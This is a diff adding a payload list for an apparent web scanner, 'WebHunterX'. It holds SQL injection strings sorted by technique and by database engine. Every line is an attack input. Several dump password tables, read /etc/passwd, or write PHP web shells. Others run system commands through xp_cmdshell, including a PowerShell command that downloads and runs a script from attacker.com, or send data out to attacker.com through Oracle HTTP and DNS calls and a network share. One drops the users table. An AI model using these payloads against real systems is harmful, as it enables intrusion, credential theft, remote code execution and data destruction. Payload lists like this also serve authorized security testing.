@@ -1,0 +1,155 @@
+# WebHunterX SQLi Payloads
+# Format: [section] pour chaque type d'injection
+# Chaque ligne est un payload distinct
+
+[error]
+'
+"
+`
+')
+")
+')-- -
+")-- -
+')#
+")#
+`-- -
+' OR '1'='1
+" OR "1"="1
+' OR 1=1-- -
+" OR 1=1-- -
+') OR ('1'='1
+") OR ("1"="1
+1' ORDER BY 1-- -
+1" ORDER BY 1-- -
+' UNION SELECT NULL-- -
+" UNION SELECT NULL-- -
+' UNION SELECT 1,2,3-- -
+" UNION SELECT 1,2,3-- -
+1' AND 1=CONVERT(int,@@version)-- -
+1' AND 1=CONVERT(int,db_name())-- -
+' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -
+' AND (SELECT 6297 FROM(SELECT COUNT(*),CONCAT(0x7176786a71,(SELECT version()),0x7176786a71,FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)-- -
+1'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -
+1'; EXEC xp_cmdshell 'ping 127.0.0.1'-- -
+' AND 5=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7)-- -
+'; WAITFOR DELAY '0:0:5'-- -
+'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+
+[time]
+1' AND SLEEP(5)-- -
+1" AND SLEEP(5)-- -
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+') AND SLEEP(5)-- -
+") AND SLEEP(5)-- -
+' WAITFOR DELAY '0:0:5'-- -
+" WAITFOR DELAY '0:0:5'-- -
+1; WAITFOR DELAY '0:0:5'-- -
+'); WAITFOR DELAY '0:0:5'-- -
+"); WAITFOR DELAY '0:0:5'-- -
+1'; SELECT pg_sleep(5)-- -
+1"); SELECT pg_sleep(5)-- -
+1; SELECT pg_sleep(5)-- -
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(82)(82),5) FROM DUAL-- -
+' AND (SELECT 6573 FROM (SELECT(SLEEP(5)))a)-- -
+1 AND 2=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.CHARACTER_SETS); SELECT BENCHMARK(5000000,MD5(0x4E446335))-- -
+1 AND SLEEP(5) AND 'a'='a
+1) AND SLEEP(5) AND (1=1
+' AND (SELECT * FROM (SELECT SLEEP(5))A) AND '1'='1
+" AND (SELECT * FROM (SELECT SLEEP(5))A) AND "1"="1
+' AND SLEEP(5) AND 'QkXM'='QkXM
+" AND SLEEP(5) AND "qaWS"="qaWS
+) AND SLEEP(5) AND (4433=4433
+)) AND SLEEP(5) AND ((7180=7180
+
+[boolean]
+1' AND 1=1-- -
+1' AND 1=2-- -
+1" AND 1=1-- -
+1" AND 1=2-- -
+1' AND 'a'='a'-- -
+1' AND 'a'='b'-- -
+1" AND "a"="a"-- -
+1" AND "a"="b"-- -
+1') AND ('a'='a
+1') AND ('a'='b
+1") AND ("a"="a
+1") AND ("a"="b
+1 AND 1=1
+1 AND 1=2
+1' AND SUBSTRING('abcd', 1, 1) = 'a'-- -
+1' AND SUBSTRING('abcd', 1, 1) = 'b'-- -
+1" AND SUBSTRING("abcd", 1, 1) = "a"-- -
+1" AND SUBSTRING("abcd", 1, 1) = "b"-- -
+1' AND ASCII(LOWER(SUBSTRING((SELECT 'a'),1,1)))=97-- -
+1' AND ASCII(LOWER(SUBSTRING((SELECT 'a'),1,1)))=98-- -
+1' AND EXISTS(SELECT 1)-- -
+1' AND NOT EXISTS(SELECT 1)-- -
+1' AND 3*2=6-- -
+1' AND 3*2=7-- -
+1' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1-- -
+1' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=2-- -
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(CHAR(77),CHAR(73),CHAR(85),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(CHAR(77),CHAR(73),CHAR(85),FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)a)-- -
+1' AND GTID_SUBSET(@@gtid_executed, CONCAT(REPEAT('f', 64), ',', @@server_uuid, ':1-', @@global.gtid_executed_compression_period))-- -
+1' AND NOT GTID_SUBSET(@@gtid_executed, CONCAT(REPEAT('f', 64), ',', @@server_uuid, ':1-', @@global.gtid_executed_compression_period))-- -
+
+[mysql]
+1' UNION SELECT user,password FROM mysql.user-- -
+1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -
+1' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'-- -
+1' UNION SELECT username,password FROM users-- -
+1' AND extractvalue(rand(),concat(0x3a,(SELECT version())))-- -
+1' AND updatexml(rand(),concat(0x3a,(SELECT version())),0)-- -
+1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
+1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- -
+1' UNION ALL SELECT LOAD_FILE('/etc/passwd')-- -
+1' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET["cmd"]); ?>'-- -
+1' UNION SELECT 1,2,3,4,@@datadir-- -
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+[postgres]
+1' UNION SELECT usename,passwd FROM pg_shadow-- -
+1' UNION SELECT table_name,table_schema FROM information_schema.tables-- -
+1' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'-- -
+1' UNION SELECT username,password FROM users-- -
+1'; SELECT pg_read_file('/etc/passwd')-- -
+1'; SELECT pg_ls_dir('.')-- -
+1'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'-- -
+1'; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT-- -
+1'; SELECT system('ls -la')-- -
+
+[mssql]
+1' UNION SELECT login,password FROM syslogins-- -
+1' UNION SELECT name,master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins-- -
+1' UNION SELECT table_name,table_schema FROM information_schema.tables-- -
+1' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'-- -
+1' UNION SELECT username,password FROM users-- -
+1'; EXEC master..xp_cmdshell 'dir'-- -
+1'; EXEC master..xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")"'-- -
+1'; BACKUP DATABASE master TO DISK = '\\\\attacker\\share\\backup.bak'-- -
+1'; DROP TABLE users-- -
+
+[oracle]
+1' UNION SELECT username,password FROM sys.user$-- -
+1' UNION SELECT table_name,owner FROM all_tables-- -
+1' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name='USERS'-- -
+1' UNION SELECT username,password FROM users-- -
+1' UNION SELECT banner FROM v$version-- -
+1' UNION SELECT name FROM v$database-- -
+1' UNION SELECT SYS.DATABASE_NAME FROM DUAL-- -
+1' UNION SELECT SYS.DB_NAME FROM DUAL-- -
+1' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')-- -
+1' AND UTL_HTTP.REQUEST('http://attacker.com/oracle'||USER)-- -
+1' UNION SELECT username,password FROM SYS.ALL_USERS-- -
+
+[sqlite]
+1' UNION SELECT 1,sqlite_version()-- -
+1' UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table'-- -
+1' UNION SELECT 1,sql FROM sqlite_master WHERE type='table' AND tbl_name='users'-- -
+1' UNION SELECT username,password FROM users-- -
+1' UNION SELECT 1,load_extension('./malicious.so','main')-- -
+1' UNION SELECT 1,readfile('/etc/passwd')-- -
+1' ATTACH DATABASE '/var/www/html/shell.php' AS hack; CREATE TABLE hack.pwn (dataz text); INSERT INTO hack.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>')-- - 
